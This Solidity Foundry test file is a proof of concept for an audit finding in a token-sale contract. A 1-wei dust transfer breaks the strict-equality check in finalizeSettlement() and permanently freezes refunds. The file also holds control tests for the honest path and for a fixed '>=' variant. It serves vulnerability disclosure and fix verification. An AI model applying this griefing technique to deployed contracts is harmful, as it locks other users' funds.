// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    HarTokenSale,
    HarTokenSaleFixed,
    MiniToken,
    Attacker,
    IERC20
} from "./63977-h-02-the-finalizesettlement-can-be-dossed-leading-to-refund.sol";

// Harmonix Finance TokenSale finding 63977 (H-02):
// finalizeSettlement() asserts the LIVE purchaseToken balance with a strict
// equality; anyone inflates it with an unsolicited dust transfer, so settlement
// can never finalize and refunds (gated on finalization) are frozen forever.
contract FinalizeSettlementDosTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant TOTAL_COMMITTED = 1_000_000 ether;
    uint256 internal constant TOTAL_ACCEPTED = 400_000 ether;
    uint256 internal constant SAFETY_BUFFER = 1000;
    uint256 internal constant USER_REFUND = 100_000 ether;

    // ── Exploit: 1 wei of dust permanently DoSes finalizeSettlement, freezing the pool ──
    function test_exploit_dustTransfer_dossesFinalization_freezesRefunds() public {
        Exploit e = new Exploit();
        e.run();

        // finalizeSettlement reverted under the dust attack, and stays unfinalized.
        assertTrue(e.finalizeReverted(), "finalizeSettlement should have reverted");
        assertFalse(e.settlementFinalizedAfterAttack(), "settlement must stay unfinalized");

        // Refunds are permanently blocked: claimRefund reverts because not finalized.
        HarTokenSale sale = HarTokenSale(e.saleAddr());
        vm.prank(USER);
        vm.expectRevert(bytes("Settlement: not finalized"));
        sale.claimRefund();

        // The finalizeSettlement call itself reverts with the strict-equality message,
        // no matter how many times the owner retries (dust is already lodged). The
        // sale's owner is the Exploit contract, so prank as it.
        vm.prank(address(e));
        vm.expectRevert(bytes("Settlement: total refund not matched"));
        sale.finalizeSettlement();

        // The entire funded refund pool (+ the 1 wei dust) is frozen in the contract.
        uint256 expectedFrozen = (TOTAL_COMMITTED - TOTAL_ACCEPTED) - SAFETY_BUFFER + 1; // funded + dust
        assertEq(e.frozenRefundPool(), expectedFrozen, "frozen refund pool magnitude");

        // Recorded on the marker token minted to the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), expectedFrozen, "marker records frozen pool at SINK");

        // Real purchaseToken is truly locked in the sale contract.
        MiniToken pt = MiniToken(e.purchaseTokenAddr());
        assertEq(pt.balanceOf(e.saleAddr()), expectedFrozen, "purchaseToken locked in sale");
        assertEq(pt.balanceOf(USER), 0, "user received no refund");
    }

    // ── Negative control A: same buggy contract, NO dust -> finalizes, user is refunded ──
    function test_control_noDust_finalizes_and_refundsPaid() public {
        MiniToken pt = new MiniToken("Purchase", "PUR");
        HarTokenSale sale = new HarTokenSale(address(pt)); // this test == owner
        sale.configure(TOTAL_COMMITTED, TOTAL_ACCEPTED);
        sale.setRefundOwed(USER, USER_REFUND);

        uint256 funded = (TOTAL_COMMITTED - TOTAL_ACCEPTED) - SAFETY_BUFFER;
        pt.mint(address(sale), funded);

        // Honest balance -> strict equality holds -> settlement finalizes.
        sale.finalizeSettlement();
        assertTrue(sale.settlementFinalized(), "finalizes without dust");

        vm.prank(USER);
        sale.claimRefund();
        assertEq(pt.balanceOf(USER), USER_REFUND, "user received refund in the honest path");
    }

    // ── Negative control B: FIXED variant survives the SAME dust attack ──
    function test_control_fixed_survivesDust_finalizes_and_refundsPaid() public {
        MiniToken pt = new MiniToken("Purchase", "PUR");
        HarTokenSaleFixed sale = new HarTokenSaleFixed(address(pt));
        sale.configure(TOTAL_COMMITTED, TOTAL_ACCEPTED);
        sale.setRefundOwed(USER, USER_REFUND);

        uint256 funded = (TOTAL_COMMITTED - TOTAL_ACCEPTED) - SAFETY_BUFFER;
        pt.mint(address(sale), funded);

        // Identical dust attack as the exploit.
        Attacker atk = new Attacker();
        pt.mint(address(atk), 1);
        atk.grief(IERC20(address(pt)), address(sale), 1);

        // `>=` tolerates the inflated balance -> settlement still finalizes.
        sale.finalizeSettlement();
        assertTrue(sale.settlementFinalized(), "fixed variant finalizes despite dust");

        vm.prank(USER);
        sale.claimRefund();
        assertEq(pt.balanceOf(USER), USER_REFUND, "user refunded under the fix despite dust");
    }
}
